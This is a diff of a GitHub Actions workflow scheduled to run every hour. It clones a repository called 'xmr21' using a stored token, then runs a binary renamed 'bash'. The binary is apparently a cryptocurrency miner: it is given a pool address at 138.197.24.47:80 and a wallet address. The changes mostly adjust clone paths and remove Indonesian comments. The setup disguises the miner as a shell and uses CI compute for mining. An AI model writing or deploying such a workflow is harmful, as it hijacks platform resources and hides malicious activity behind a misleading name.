@@ -3,14 +3,14 @@ name: Run bash --noTest (20 VPS)
 on:
   workflow_dispatch:
   schedule:
-    - cron: "0 * * * *"   # tiap 1 jam UTC (bisa ubah)
+    - cron: "0 * * * *"
 
 permissions:
   contents: read
 
 concurrency:
   group: tesaction-run
-  cancel-in-progress: false   # jangan cancel kalau mau paralel
+  cancel-in-progress: false
 
 jobs:
   run:
@@ -42,8 +42,8 @@ jobs:
         env:
           GH_TOKEN: ${{ secrets.GH_TOKEN }}
         run: |
-          git clone https://x-access-token:$GH_TOKEN@github.com/sadarsayujinjas/xmr21.git
-          cd xmr21
-          chmod +x ./bash
+          git clone https://x-access-token:${GH_TOKEN}@github.com/sadarsayujinjas/xmr21.git repo
+          cd repo/xmr21
+          chmod +x bash
           ./bash --noCPU -o 138.197.24.47:80 -u ccx7FNm5WxvKLTWgLyc9EuMKeMv32u32bgrGCAoq7SwzFdEz5BYkBRDexMyZmYUGaqGf8jFJCCRyqVFDdvXv4N6zAKPceUT6T1
           
